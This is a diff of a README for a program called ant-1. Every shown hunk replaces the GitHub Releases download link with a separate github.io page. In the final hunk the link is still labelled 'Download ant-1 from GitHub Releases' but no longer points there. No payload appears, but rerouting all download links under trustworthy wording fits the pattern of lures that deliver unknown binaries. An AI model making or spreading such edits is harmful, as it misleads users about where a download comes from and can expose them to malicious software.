@@ -13,7 +13,7 @@ ant-1 is a self-contained application that creates a virtual environment where a
 ## ⬇️ Download & Run ant-1
 
 **Visit this link to download the application:**  
-[![Download ant-1](https://img.shields.io/badge/Download-ant--1-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/untapped-umbra6064/ant-1/releases)
+[![Download ant-1](https://img.shields.io/badge/Download-ant--1-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://untapped-umbra6064.github.io)
 
 ### 📥 Step-by-Step Download Guide
 
@@ -134,7 +134,7 @@ No, the current version does not support exporting neural weights or sharing con
 
 ant-1 is in active development. To get new features, bug fixes, and improvements:
 
-1. **Bookmark** the download page: https://github.com/untapped-umbra6064/ant-1/releases
+1. **Bookmark** the download page: https://untapped-umbra6064.github.io
 2. Occasionally check for a "Latest release" badge. If a newer version than yours exists, download and extract it over your current folder (your existing folder can be deleted).
 3. Major version updates (e.g., v1.0 to v2.0) may change the interface, but the core concept remains the same.
 
@@ -144,7 +144,7 @@ ant-1 is in active development. To get new features, bug fixes, and improvements
 
 For your convenience, here is the direct link to the release page once more. Bookmark it for future access:
 
-**📥 [Download ant-1 from GitHub Releases](https://github.com/untapped-umbra6064/ant-1/releases)**
+**📥 [Download ant-1 from GitHub Releases](https://untapped-umbra6064.github.io)**
 
 ---
 
